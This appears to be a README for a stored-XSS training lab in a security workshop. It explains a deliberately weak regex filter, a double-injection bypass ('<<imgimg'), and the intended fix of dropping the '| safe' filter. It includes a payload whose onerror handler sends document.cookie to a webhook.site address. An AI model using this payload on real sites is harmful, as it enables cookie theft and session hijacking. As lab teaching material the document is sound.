# Lab 1 — Stored XSS

Open [walkthrough.html](/Users/youssefbadaoui/cdg-sessions/day1/lab1-xss/walkthrough.html:1) directly in your browser for the standalone walkthrough.

This lab now uses:
- a weak regex filter that strips `<tag`
- a bypass using double injection such as `<<imgimg ...>`
- a webhook-based exfiltration flow instead of local `/steal` and `/stolen` endpoints

Suggested payload shape:

```html
<<imgimg src=x onerror=fetch('https://webhook.site/your-id?c='+document.cookie)>
```

The intended fix is still the same: stop rendering user content with `| safe`, and use real sanitization only if HTML is genuinely required.
